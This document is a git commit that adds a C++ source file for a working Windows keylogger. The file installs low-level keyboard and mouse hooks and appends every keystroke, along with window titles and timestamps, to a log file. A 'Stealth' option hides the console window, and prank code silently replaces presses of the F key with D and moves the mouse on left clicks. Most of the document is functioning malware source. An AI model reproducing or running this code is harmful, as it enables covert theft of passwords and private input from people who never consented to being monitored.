81c083079ded94e0c46847f4a74712561051a25a
RuBublik <relik@sweethome.local>
2022-12-29 20:51:31 +0200

    initial commit - when i remembered to use git, and stopped working like a barbarian.

---
+++ keylogger_hooker.cpp
@@ -0,0 +1,296 @@
+#define UNICODE
+#include <Windows.h>
+#include <cstdio>
+#include <fstream>
+#include <iostream>
+#include <sstream>
+#include <time.h>
+#include <map>
+
+// defines whether the window is visible or not
+#define visible // (visible / invisible)
+
+const std::map<int, std::string> keyname{ 
+	{VK_BACK, "[BACKSPACE]" },
+	{VK_RETURN,	"\n" },
+	{VK_SPACE,	"_" },
+	{VK_TAB,	"[TAB]" },
+	{VK_SHIFT,	"[SHIFT]" },
+	{VK_LSHIFT,	"[LSHIFT]" },
+	{VK_RSHIFT,	"[RSHIFT]" },
+	{VK_CONTROL,	"[CONTROL]" },
+	{VK_LCONTROL,	"[LCONTROL]" },
+	{VK_RCONTROL,	"[RCONTROL]" },
+	{VK_MENU,	"[ALT]" },
+	{VK_LWIN,	"[LWIN]" },
+	{VK_RWIN,	"[RWIN]" },
+	{VK_ESCAPE,	"[ESCAPE]" },
+	{VK_END,	"[END]" },
+	{VK_HOME,	"[HOME]" },
+	{VK_LEFT,	"[LEFT]" },
+	{VK_RIGHT,	"[RIGHT]" },
+	{VK_UP,		"[UP]" },
+	{VK_DOWN,	"[DOWN]" },
+	{VK_PRIOR,	"[PG_UP]" },
+	{VK_NEXT,	"[PG_DOWN]" },
+	{VK_OEM_PERIOD,	"." },
+	{VK_DECIMAL,	"." },
+	{VK_OEM_PLUS,	"+" },
+	{VK_OEM_MINUS,	"-" },
+	{VK_ADD,		"+" },
+	{VK_SUBTRACT,	"-" },
+	{VK_CAPITAL,	"[CAPSLOCK]" },
+};
+
+HHOOK hKeybdHook;    //will point to handle to the KEYBOARD hook procedure.
+HHOOK hMouseHook;    //will point to handle to the MOUSE hook procedure.
+
+int SaveKeybd(int keycode);
+int SaveMouse(POINT point);
+std::ofstream output_file;
+
+
+LRESULT __stdcall LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode < 0) {    // do not process the message if nCode less than 0
+        return CallNextHookEx(hKeybdHook, nCode, wParam, lParam);
+    }
+    // for WH_KEYBOARD_LL, non zero nCode must be HC_ACTION ?
+    if (wParam == WM_KEYDOWN)
+    {
+		LPKBDLLHOOKSTRUCT pKeybdHookParam;
+		pKeybdHookParam = (LPKBDLLHOOKSTRUCT)lParam;
+		/*
+            FUNNY ADDTITION HAHA
+            simulating keybd events if some condition is met -
+				simulating 'D' press upon press on 'F'
+				also, stopping hook chain so this key is not actually pressed (:
+        */ 
+		if (pKeybdHookParam->vkCode == 0x46) //vitual key-code of 'F' key.
+		{ 
+			// Simulate a key press on 'D' instead
+			keybd_event(0x44,                       // the key 'D'
+						0x0,                        // i-net says doesn't matter
+						KEYEVENTF_EXTENDEDKEY | 0,  // \?
+					0 );                          	// not needed
+			// Simulate a key release
+			keybd_event(0x44,                       // the key 'D'
+					0x0,	                    	// i-net says doesn't matter
+					KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,  // If specified, the key is being released. If not specified, the key is being depressed.
+					0);                           	// not needed
+		}
+		//continue to normal processing of keylogger
+		else 
+		{
+			// save to file
+			SaveKeybd(pKeybdHookParam->vkCode);
+			// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+			return CallNextHookEx(hKeybdHook, nCode, wParam, lParam);
+		}
+    }
+}
+
+LRESULT CALLBACK LowLvlMouseHookCallback(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) 
+{
+	if (nCode < 0) // do not process the message if nCode less than 0
+	{
+        return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
+    }
+	
+	LPMSLLHOOKSTRUCT pMouseHookParam;
+	pMouseHookParam = (LPMSLLHOOKSTRUCT)lParam;
+	if (wParam == WM_RBUTTONDOWN) {	//if event is of a left mouse button depressed -
+		SaveMouse(pMouseHookParam->pt);
+	}
+
+	/*
+	FUNNY ADDTITION HAHA
+	simulating mouse events
+		simulating movement some pixels aside upon leftclick
+		also, passing leftclick press to hook chain only after moving the mouse (:
+	*/ 
+	else if (wParam == WM_LBUTTONDOWN)
+	{
+		static int direction_modifier = 1;	//used to alternate direction of mouse trick
+		mouse_event(MOUSEEVENTF_MOVE,
+				50*direction_modifier,	// some pixels left or right, depending on sign of direction_modifier
+				0, 0, 0);				// not needed to change
+		direction_modifier =- direction_modifier;	// alternate sign of direction_modifier
+	}
+	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
+}
+
+void SetLowLvLKeybdHook()
+{
+	if (!(hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLvlKeybdHookCallback, NULL, 0)))
+	{
+		LPCWSTR lpText = L"Failed to install keyboard hook!";
+		LPCWSTR lpCaption = L"Error";
+		MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
+	}
+}
+
+void SetLowLvlMouseHook()
+{
+	if (!(hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLvlMouseHookCallback, NULL, 0)))
+	{
+		LPCWSTR lpText = L"Failed to install mouse hook!";
+		LPCWSTR lpCaption = L"Error";
+		MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
+	}
+}
+
+void ReleaseLowLvlKeybdHook()
+{
+	UnhookWindowsHookEx(hKeybdHook);
+}
+
+void ReleaseLowLvlMouseHook()
+{
+	UnhookWindowsHookEx(hMouseHook);
+}
+
+const char* FormatLogForNewActiveWindow (HWND window, char* to_log) {
+	static char lastwindow[256] = "";	//will save window_title of last active window. compared to current window_title.
+	char window_title[256];
+	GetWindowTextA(window, (LPSTR)window_title, 256);
+
+	if (strcmp(window_title, lastwindow) != 0)
+	{
+		strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+
+		// get time
+		time_t t = time(NULL);
+		struct tm tm;
+		localtime_s(&tm, &t);
+		char s[64];
+		strftime(s, sizeof(s), "%c", &tm);
+
+		//TODO: check length of inserted strings (secure from buffer overflow)
+		sprintf (to_log, "[Time: %s | Window: %s ]",s, window_title);
+	}
+	return to_log;
+}
+
+int SaveMouse(POINT point)
+{
+	std::stringstream output;
+	HWND foreground = GetForegroundWindow();
+	DWORD threadID;
+
+	char title[300];
+	if (foreground)
+	{
+		//make log title
+		FormatLogForNewActiveWindow(foreground, title);
+		output << title << " - MOUSE RCLK: "; 
+	}
+	
+	char coords[20];
+	sprintf (coords, "(%ld, %ld)", point.x, point.y);	//TODO: check length of inserted strings (secure from buffer overflow)
+	output << coords << std::endl;
+	
+	// instead of opening and closing file handlers every time, keep file open and flush.
+	output_file << output.str();
+	output_file.flush();	// TODO: add periodic close + reopen to save the file.
+	
+	std::cout << output.str();
+
+	return 0;
+}
+
+int SaveKeybd(int keycode)
+{
+	std::stringstream output;
+	HWND foreground = GetForegroundWindow();
+	DWORD threadID;
+	HKL layout = NULL;
+	char title[300];
+
+	if (foreground)
+	{
+		//make log title
+		FormatLogForNewActiveWindow(foreground, title);
+		output << title << " - KEYBD PRSS: " ; 
+
+		// get keyboard layout of thread running the window
+		threadID = GetWindowThreadProcessId(foreground, NULL);
+		layout = GetKeyboardLayout(threadID);	
+	}
+
+	// process keycode
+	if (keyname.find(keycode) != keyname.end())		// if is special Key
+	{
+		output << keyname.at(keycode);
+	}
+	else
+	{
+		// map virtual key according to keyboard layout
+		char key= MapVirtualKeyExA(keycode, MAPVK_VK_TO_CHAR, layout);
+
+		// check for shift/caps modifiers
+		// check for caps lock
+		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+		// check shift key (inverses an active caps lock)
+		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		{
+			lowercase = !lowercase;
+		}
+
+		// tolower converts it to lowercase properly
+		if (!lowercase)
+		{
+			key = tolower(key);
+		}
+
+		output << char(key) << std::endl;
+	}
+	// instead of opening and closing file handlers every time, keep file open and flush.
+	output_file << output.str();
+	output_file.flush();	// TODO: add periodic close + reopen to save the file.
+
+	std::cout << output.str();
+
+	return 0;
+}
+
+void Stealth()
+{
+#ifdef visible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+#endif
+
+#ifdef invisible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+#endif
+}
+
+int main()
+{
+	// open output file in append mode
+	const char* output_filename = "keylogger.log";
+	std::cout << "Logging output to " << output_filename << std::endl;
+	output_file.open(output_filename, std::ios_base::app);
+
+	// controls console window style (visible/invisible)
+	Stealth();
+
+	// setting hooks
+	SetLowLvLKeybdHook();
+	SetLowLvlMouseHook();
+
+	// loop to keep the console application running.
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		TranslateMessage(&msg);
+        DispatchMessage(&msg);
+	}
+
+	// releasing hooks
+	ReleaseLowLvlKeybdHook();
+	ReleaseLowLvlMouseHook();
+
+	return 0;
+}
